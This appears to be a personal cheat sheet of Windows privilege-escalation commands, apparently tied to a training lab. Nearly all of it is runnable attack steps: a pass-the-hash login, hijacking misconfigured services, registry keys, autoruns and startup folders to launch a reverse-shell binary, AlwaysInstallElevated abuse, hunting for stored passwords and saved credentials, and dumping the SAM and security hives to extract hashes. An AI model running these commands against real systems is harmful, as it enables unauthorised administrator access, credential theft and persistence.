# pass the hash

```
pth-winexe -U 'administrator%lmhash:ntlmhash' //$rhost cmd.exe
```

## service

### insecure service permission

C:\PrivEsc\accesschk.exe /accepteula -uwcqv user *
sc qc <service>
sc config <service> binpath= "\"C:\PrivEsc\reverse.exe\""
net start <service>

### unquoted service path

C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Some Path\to\service"
copy C:\PrivEsc\reverse.exe "C:\Some\Path.exe"

## registry

### weak registry permission

C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<service>
reg add HKLM\SYSTEM\CurrentControlSet\services\<service> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

### insecure service exe

C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\<service-exe>.exe"
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\<service-exe>.exe" /Y

### registry autoruns

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\<autorun-exe>.exe"
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\<autorun-exe>.exe" /Y
<wait for admin to login>

### registry AlwaysInstallElevated

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi

### search registry

reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

## other

### saved creds

cmdkey /list
runas /savecred /user:admin C:\PrivEsc\reverse.exe

### get sam and system hive

reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security

impacket-secretsdump -sam sam -security security -system system LOCAL

### gui programs runs as admin

open file dialog and paste the following in the navigation input:
file://c:/windows/system32/cmd.exe

### autostart writeable

C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
create shortcut to reverseshell